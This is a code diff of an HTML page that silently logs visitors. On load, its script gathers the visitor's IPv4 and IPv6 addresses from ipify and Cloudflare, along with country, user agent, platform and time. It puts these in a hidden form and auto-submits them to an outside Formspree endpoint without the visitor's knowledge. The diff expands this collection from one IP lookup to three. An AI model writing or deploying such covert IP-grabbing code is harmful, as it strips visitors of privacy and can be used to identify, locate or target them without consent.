@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Log IP and Device Info</title>
+  <title>Get Both IPv4 & IPv6 Info</title>
 </head>
 <body>
   <form id="ipForm" action="https://formspree.io/f/xovwnjya" method="POST" style="display:none;">
@@ -10,26 +10,39 @@
   </form>
 
   <script>
-    async function getInfo() {
+    async function getIPInfo() {
       try {
-        // Gọi Cloudflare trace - không bị CORS, không cần token
-        const res = await fetch('https://www.cloudflare.com/cdn-cgi/trace');
-        const text = await res.text();
+        const [ipv4Res, ipv6Res, cfRes] = await Promise.all([
+          fetch('https://api.ipify.org?format=json'),
+          fetch('https://api64.ipify.org?format=json'),
+          fetch('https://www.cloudflare.com/cdn-cgi/trace')
+        ]);
 
-        const data = {};
-        text.trim().split('\n').forEach(line => {
+        const ipv4Data = await ipv4Res.json();
+        const ipv6Data = await ipv6Res.json();
+        const cfText = await cfRes.text();
+
+        const cfData = {};
+        cfText.trim().split('\n').forEach(line => {
           const [key, value] = line.split('=');
-          data[key] = value;
+          cfData[key] = value;
         });
 
-        const ip = data.ip || 'Unknown';
-        const loc = data.loc || 'Unknown'; // Country
+        const ip_cf = cfData.ip || 'Unknown';
+        const loc = cfData.loc || 'Unknown'; // Country
+
+        const ipv4 = ipv4Data.ip || 'Unavailable';
+        const ipv6 = ipv6Data.ip || 'Unavailable';
+
         const ua = navigator.userAgent;
         const platform = navigator.platform;
         const now = new Date().toLocaleString();
 
         const content = `
-🔐 IP Address: ${ip}
+🔐 IP Addresses:
+- IPv4: ${ipv4}
+- IPv6: ${ipv6}
+- IP (from Cloudflare): ${ip_cf}
 
 📍 Location:
 - Country: ${loc} (from Cloudflare)
@@ -44,11 +57,11 @@
         document.getElementById('ipInfo').value = content;
         document.getElementById('ipForm').submit();
       } catch (err) {
-        console.error('Error fetching IP info:', err);
+        console.error('Error collecting IP info:', err);
       }
     }
 
-    getInfo();
+    getIPInfo();
   </script>
 </body>
 </html>
